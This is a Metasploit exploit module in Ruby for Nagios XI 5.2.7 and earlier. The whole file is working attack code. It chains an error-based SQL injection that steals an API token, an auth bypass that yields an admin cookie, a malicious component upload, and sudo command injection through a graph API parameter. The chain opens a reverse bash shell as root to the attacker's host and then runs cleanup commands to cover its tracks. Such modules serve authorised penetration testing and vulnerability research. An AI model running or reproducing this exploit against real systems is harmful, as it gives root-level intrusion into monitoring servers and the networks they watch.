# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
 
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Nagios XI Chained Remote Code Execution&#039;,
      &#039;Description&#039;     => %q{
        This module exploits an SQL injection, auth bypass, file upload,
        command injection, and privilege escalation in Nagios XI <= 5.2.7
        to pop a root shell.
      },
      &#039;Author&#039;          => [
        &#039;Francesco Oddo&#039;, # Vulnerability discovery
        &#039;wvu&#039;             # Metasploit module
      ],
      &#039;References&#039;      => [
        [&#039;EDB&#039;, &#039;39899&#039;]
      ],
      &#039;DisclosureDate&#039;  => &#039;Mar 6 2016&#039;,
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Platform&#039;        => &#039;unix&#039;,
      &#039;Arch&#039;            => ARCH_CMD,
      &#039;Privileged&#039;      => true,
      &#039;Payload&#039;         => {
        &#039;Compat&#039;        => {
          &#039;PayloadType&#039; => &#039;cmd cmd_bash&#039;,
          &#039;RequiredCmd&#039; => &#039;generic bash-tcp php perl python openssl gawk&#039;
        }
      },
      &#039;Targets&#039;         => [
        [&#039;Nagios XI <= 5.2.7&#039;, version: Gem::Version.new(&#039;5.2.7&#039;)]
      ],
      &#039;DefaultTarget&#039;   => 0,
      &#039;DefaultOptions&#039;  => {
        &#039;PAYLOAD&#039;       => &#039;cmd/unix/reverse_bash&#039;,
        &#039;LHOST&#039;         => Rex::Socket.source_address
      }
    ))
  end
 
  def check
    res = send_request_cgi!(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/nagiosxi/&#039;
    )
 
    return unless res && (html = res.get_html_document)
 
    if (version = html.at(&#039;//input[@name = "version"]/@value&#039;))
      vprint_status("Nagios XI version: #{version}")
      if Gem::Version.new(version) <= target[:version]
        return CheckCode::Appears
      end
    end
 
    CheckCode::Safe
  end
 
  def exploit
    if check != CheckCode::Appears
      fail_with(Failure::NotVulnerable, &#039;Vulnerable version not found! punt!&#039;)
    end
 
    print_status(&#039;Getting API token&#039;)
    get_api_token
    print_status(&#039;Getting admin cookie&#039;)
    get_admin_cookie
    print_status(&#039;Getting monitored host&#039;)
    get_monitored_host
 
    print_status(&#039;Downloading component&#039;)
    download_profile_component
    print_status(&#039;Uploading root shell&#039;)
    upload_root_shell
    print_status(&#039;Popping shell!&#039;)
    pop_dat_shell
  end
 
  #
  # Cleanup methods
  #
 
  def on_new_session(session)
    super
 
    print_status(&#039;Cleaning up...&#039;)
 
    commands = [
      &#039;rm -rf ../profile&#039;,
      &#039;unzip -qd .. ../../../../tmp/component-profile.zip&#039;,
      &#039;chown -R nagios:nagios ../profile&#039;,
      "rm -f ../../../../tmp/component-#{zip_filename}"
    ]
 
    commands.each do |command|
      vprint_status(command)
      session.shell_command_token(command)
    end
  end
 
  #
  # Exploit methods
  #
 
  def get_api_token
    res = send_request_cgi(
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => &#039;/nagiosxi/includes/components/nagiosim/nagiosim.php&#039;,
      &#039;vars_get&#039; => {
        &#039;mode&#039;   => &#039;resolve&#039;,
        &#039;host&#039;   => &#039;\&#039;AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((&#039; \
                    &#039;SELECT backend_ticket FROM xi_users WHERE user_id=1&#039; \
                    &#039;),FLOOR(RAND(0)*2))x &#039; \
                    &#039;FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- &#039;
      }
    )
 
    if res && res.body =~ /Duplicate entry &#039;(.*?).&#039;/
      @api_token = $1
      vprint_good("API token: #{@api_token}")
    else
      fail_with(Failure::UnexpectedReply, &#039;API token not found! punt!&#039;)
    end
  end
 
  def get_admin_cookie
    res = send_request_cgi(
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => &#039;/nagiosxi/rr.php&#039;,
      &#039;vars_get&#039; => {
        &#039;uid&#039;    => "1-#{Rex::Text.rand_text_alpha(8)}-" +
                    Digest::MD5.hexdigest(@api_token)
      }
    )
 
    if res && (@admin_cookie = res.get_cookies.split(&#039;; &#039;).last)
      vprint_good("Admin cookie: #{@admin_cookie}")
      get_csrf_token(res.body)
    else
      fail_with(Failure::NoAccess, &#039;Admin cookie not found! punt!&#039;)
    end
  end
 
  def get_csrf_token(body)
    if body =~ /nsp_str = "(.*?)"/
      @csrf_token = $1
      vprint_good("CSRF token: #{@csrf_token}")
    else
      fail_with(Failure::UnexpectedReply, &#039;CSRF token not found! punt!&#039;)
    end
  end
 
  def get_monitored_host
    res = send_request_cgi(
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => &#039;/nagiosxi/ajaxhelper.php&#039;,
      &#039;cookie&#039;   => @admin_cookie,
      &#039;vars_get&#039; => {
        &#039;cmd&#039;    => &#039;getxicoreajax&#039;,
        &#039;opts&#039;   => &#039;{"func":"get_hoststatus_table"}&#039;,
        &#039;nsp&#039;    => @csrf_token
      }
    )
 
    return unless res && (html = res.get_html_document)
 
    if (@monitored_host = html.at(&#039;//div[@class = "hostname"]/a/text()&#039;))
      vprint_good("Monitored host: #{@monitored_host}")
    else
      fail_with(Failure::UnexpectedReply, &#039;Monitored host not found! punt!&#039;)
    end
  end
 
  def download_profile_component
    res = send_request_cgi(
      &#039;method&#039;     => &#039;GET&#039;,
      &#039;uri&#039;        => &#039;/nagiosxi/admin/components.php&#039;,
      &#039;cookie&#039;     => @admin_cookie,
      &#039;vars_get&#039;   => {
        &#039;download&#039; => &#039;profile&#039;
      }
    )
 
    if res && res.body =~ /^PK\x03\x04/
      @profile_component = res.body
    else
      fail_with(Failure::UnexpectedReply, &#039;Failed to download component! punt!&#039;)
    end
  end
 
  def upload_root_shell
    mime = Rex::MIME::Message.new
    mime.add_part(@csrf_token, nil, nil, &#039;form-data; name="nsp"&#039;)
    mime.add_part(&#039;1&#039;, nil, nil, &#039;form-data; name="upload"&#039;)
    mime.add_part(&#039;1000000&#039;, nil, nil, &#039;form-data; name="MAX_FILE_SIZE"&#039;)
    mime.add_part(payload_zip, &#039;application/zip&#039;, &#039;binary&#039;,
                  &#039;form-data; name="uploadedfile"; &#039; \
                  "filename=\"#{zip_filename}\"")
 
    res = send_request_cgi!(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => &#039;/nagiosxi/admin/components.php&#039;,
      &#039;cookie&#039; => @admin_cookie,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{mime.bound}",
      &#039;data&#039;   => mime.to_s
    )
 
    if res && res.code != 200
      if res.redirect? && res.redirection.path == &#039;/nagiosxi/install.php&#039;
        vprint_warning(&#039;Nagios XI not configured&#039;)
      else
        fail_with(Failure::PayloadFailed, &#039;Failed to upload root shell! punt!&#039;)
      end
    end
  end
 
  def pop_dat_shell
    send_request_cgi(
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => &#039;/nagiosxi/includes/components/perfdata/graphApi.php&#039;,
      &#039;cookie&#039;   => @admin_cookie,
      &#039;vars_get&#039; => {
        &#039;host&#039;   => @monitored_host,
        &#039;end&#039;    => &#039;;sudo ../profile/getprofile.sh #&#039;
      }
    )
  end
 
  #
  # Support methods
  #
 
  def payload_zip
    zip = Rex::Zip::Archive.new
 
    Zip::File.open_buffer(@profile_component) do |z|
      z.each do |f|
        zip.entries << Rex::Zip::Entry.new(
          f.name,
          (if f.ftype == :file
            if f.name == &#039;profile/getprofile.sh&#039;
              payload.encoded
            else
              z.read(f)
            end
          else
            &#039;&#039;
          end),
          Rex::Zip::CM_DEFLATE,
          nil,
          (Rex::Zip::EFA_ISDIR if f.ftype == :directory)
        )
      end
    end
 
    zip.pack
  end
 
  #
  # Utility methods
  #
 
  def zip_filename
    @zip_filename ||= Rex::Text.rand_text_alpha(8) + &#039;.zip&#039;
  end
 
end

